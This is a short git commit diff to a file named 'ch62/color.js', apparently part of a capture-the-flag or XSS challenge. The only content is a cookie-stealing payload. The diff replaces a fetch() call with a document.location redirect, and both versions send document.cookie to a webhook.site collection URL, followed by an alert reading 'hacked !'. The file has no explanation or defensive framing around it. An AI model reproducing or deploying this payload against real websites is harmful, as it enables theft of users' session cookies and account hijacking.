d5107be059109c7ae386ceea58ebfa4ac567aa5d
JustAD3v <138859329+JustAD3v@users.noreply.github.com>
2025-01-22 19:03:30 +0100

    Update color.js

--- ch62/color.js
+++ ch62/color.js
@@ -1,2 +1,2 @@
-fetch(`https://webhook.site/b3ed921b-1462-4881-9751-939f12488b5a?name=${document.cookie}`)
+document.location = `https://webhook.site/b3ed921b-1462-4881-9751-939f12488b5a?name=${document.cookie}`
 alert('hacked !'); 
